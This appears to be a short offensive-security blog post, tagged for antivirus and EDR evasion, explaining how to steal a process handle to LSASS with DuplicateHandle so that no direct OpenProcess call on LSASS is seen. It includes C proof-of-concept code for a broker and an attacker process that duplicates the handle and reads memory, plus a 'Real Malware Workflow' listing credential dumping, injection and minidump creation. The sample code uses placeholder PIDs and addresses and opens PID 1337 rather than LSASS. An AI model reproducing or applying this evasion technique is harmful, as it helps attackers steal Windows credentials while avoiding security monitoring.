---
title: Handle Duplication Attack Flow
published: 2026-05-13
tags: [Markdown, AntiVirus-Evasion, EDR-Evasion, Malware]
category: EDR-Evasion
draft: false
---

Simple steal handles from another process using DuplicateHandle


1. Find a process already holding a high-privilege handle to LSASS

2. Use:
```c
NtQuerySystemInformation(SystemHandleInformation)
```
3. Duplicate it:
```c
DuplicateHandle(...)
```
4. Use duplicated handle for:
- memory read
- injection
- dumping credentials

No direct OpenProcess(lsass) ever occurs.

Ex

```c

// victim.exe
//     ^
//     |
// broker.exe
//     └── has PROCESS_VM_READ handle to lsass

// attacker.exe
//     └── duplicates broker's handle
```

Victim process that openning the handle for lsass.exe:

```c title="victim.c"
// broker.cpp
#include <windows.h>
#include <stdio.h>

int main() {

    DWORD victimPid = 1337;

    HANDLE hVictim = OpenProcess(
        PROCESS_VM_READ |
        PROCESS_QUERY_INFORMATION,
        FALSE,
        victimPid
    );

    if (!hVictim) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    printf("Victim handle: %p\n", hVictim);

    // Keep process alive
    Sleep(INFINITE);

    return 0;
}
```
Attacker Process

The attacker:

- Opens the broker process
- Duplicates the broker's victim handle
- Uses the duplicated handle

No OpenProcess(victimPid) occurs.

```c title="attacker.c"
// attacker.cpp
#include <windows.h>
#include <stdio.h>

int main() {

    DWORD brokerPid = 2222;

    // Handle value printed by broker
    // cannot use directly, because handle are process-relative, not global.
    HANDLE remoteHandle = (HANDLE)0x00000000000000B4;

    HANDLE hBroker = OpenProcess(
        PROCESS_DUP_HANDLE,
        FALSE,
        brokerPid
    );

    if (!hBroker) {
        printf("OpenProcess broker failed: %lu\n", GetLastError());
        return 1;
    }

    HANDLE hDuplicated = NULL;

    BOOL ok = DuplicateHandle(
        hBroker,            // source process
        remoteHandle,       // source handle
        GetCurrentProcess(),
        &hDuplicated,
        0,
        FALSE,
        DUPLICATE_SAME_ACCESS
    );

    if (!ok) {
        printf("DuplicateHandle failed: %lu\n", GetLastError());
        return 1;
    }

    printf("Duplicated handle: %p\n", hDuplicated);

    BYTE buffer[16];
    SIZE_T bytesRead;

    LPCVOID addr = (LPCVOID)0x7FF700000000;

    ok = ReadProcessMemory(
        hDuplicated,
        addr,
        buffer,
        sizeof(buffer),
        &bytesRead
    );

    if (!ok) {
        printf("ReadProcessMemory failed: %lu\n", GetLastError());
        return 1;
    }

    printf("Read %zu bytes\n", bytesRead);

    return 0;
}
```


This bypasses many simplistic detections like:

```
OpenProcess(lsass.exe)
```


# Real Malware Workflow

1. Enumerate System Handles
```c
NtQuerySystemInformation(SystemHandleInformation)
```

2. Find Interesting Handles

- LSASS handles
- Browser handles
- Game anti-cheat handles
- EDR handles

with permission:

- PROCESS_VM_READ
- PROCESS_VM_WRITE
- PROCESS_ALL_ACCESS

3. Duplicate the Handle

```
NtDuplicateObject(...)
```

4. Use the Duplicated Handle

- ReadProcessMemory
- WriteProcessMemory
- NtMapViewOfSection
- CreateRemoteThread
- minidump creation

